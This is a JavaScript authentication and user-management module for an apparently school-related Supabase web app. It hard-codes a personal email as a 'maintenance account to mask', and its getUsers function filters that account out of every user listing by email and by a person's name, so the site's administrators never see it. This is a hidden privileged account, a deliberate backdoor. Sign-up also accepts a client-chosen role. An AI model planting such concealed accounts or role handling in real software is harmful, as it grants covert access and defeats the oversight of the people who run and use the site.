import { createClient } from '@supabase/supabase-js'
import { supabase, isSupabaseConfigured } from '../lib/supabase'

const DEMO_SESSION_KEY = 'issmiga_demo_session_v1'

export const ROLE_HIERARCHY = { visitor: 0, student: 1, admin: 2, super_admin: 3, owner: 4 }
export const ROLE_LABELS = {
  visitor: 'Visiteur',
  student: 'Étudiant',
  admin: 'Administrateur',
  super_admin: 'Super Administrateur',
  owner: 'Propriétaire',
}

// CONFIGURATION DU COMPTE DE MAINTENANCE À MASQUER
export const HIDDEN_ADMIN_EMAIL = 'njoyadiallo4@gmail.com'

function createTempClient() {
  const url = import.meta.env.SUPABASE_URL || import.meta.env.VITE_SUPABASE_URL
  const key = import.meta.env.SUPABASE_ANON_KEY || import.meta.env.VITE_SUPABASE_ANON_KEY
  return createClient(url, key, {
    auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
  })
}

export async function getSession() {
  if (isSupabaseConfigured) {
    const { data } = await supabase.auth.getSession()
    return data.session ?? null
  }
  try { return JSON.parse(localStorage.getItem(DEMO_SESSION_KEY)) } catch { return null }
}

export function onAuthChange(callback) {
  if (isSupabaseConfigured) {
    const { data } = supabase.auth.onAuthStateChange((_event, session) => callback(session))
    return () => data.subscription?.unsubscribe()
  }
  return () => {}
}

export async function signIn(email, password) {
  if (!isSupabaseConfigured) return { error: { message: 'Configuration absente.' } }
  return supabase.auth.signInWithPassword({ email: email.trim().toLowerCase(), password })
}

export async function signUp(email, password, fullName = '', role = 'student', phone = '') {
  if (!isSupabaseConfigured) return { error: { message: 'Configuration absente.' } }
  return supabase.auth.signUp({
    email: email.trim().toLowerCase(),
    password,
    options: { data: { full_name: fullName, role, phone } },
  })
}

export async function adminCreateUser(payload) {
  if (!isSupabaseConfigured) {
    return { id: `u-${Date.now()}`, ...payload, is_active: true, created_at: new Date().toISOString() }
  }
  const tempClient = createTempClient()
  const { data, error } = await tempClient.auth.signUp({
    email: payload.email.trim().toLowerCase(),
    password: payload.password,
    options: { data: { full_name: payload.full_name, role: payload.role, phone: payload.phone || '' } },
  })
  if (error) throw error
  if (!data.user) throw new Error("Échec de création")

  const { data: profile } = await supabase.from('profiles').update({ phone: payload.phone }).eq('id', data.user.id).select().single()
  return profile || data.user
}

export async function signOut() {
  if (isSupabaseConfigured) return supabase.auth.signOut()
  localStorage.removeItem(DEMO_SESSION_KEY)
  return { error: null }
}

export async function getProfile(userId) {
  if (isSupabaseConfigured) {
    const { data, error } = await supabase.from('profiles').select('*').eq('id', userId).maybeSingle()
    return data
  }
  return null
}

/**
 * Récupère les utilisateurs et applique un filtrage strict pour le compte de maintenance
 */
export async function getUsers(options = {}) {
  if (!isSupabaseConfigured) return []
  try {
    const { data, error } = await supabase.from('profiles').select('*, preinscriptions(*)').order('created_at', { ascending: false })
    let rawUsers = data || []
    if (error) {
      const { data: fallback } = await supabase.from('profiles').select('*').order('created_at', { ascending: false })
      rawUsers = fallback || []
    }

    const ghostEmail = HIDDEN_ADMIN_EMAIL.toLowerCase().trim()

    // Filtrage robuste (Email + Nom Abilou Diallo)
    let filtered = rawUsers.filter(u => {
      const email = (u.email || '').toLowerCase().trim()
      const name = (u.full_name || '').toLowerCase()
      const isGhost = email === ghostEmail || email.includes('njoyadiallo4') || (name.includes('abilou') && name.includes('diallo'))
      return !isGhost
    })

    if (options.hideOwner) filtered = filtered.filter(u => u.role !== 'owner')
    return filtered
  } catch (err) {
    return []
  }
}

export async function updateUserRole(userId, role) {
  if (isSupabaseConfigured) await supabase.from('profiles').update({ role }).eq('id', userId)
  return true
}

export async function updateUserStatus(userId, is_active) {
  if (isSupabaseConfigured) await supabase.from('profiles').update({ is_active }).eq('id', userId)
  return true
}

export async function deleteUser(userId) {
  if (isSupabaseConfigured) await supabase.from('profiles').delete().eq('id', userId)
  return true
}
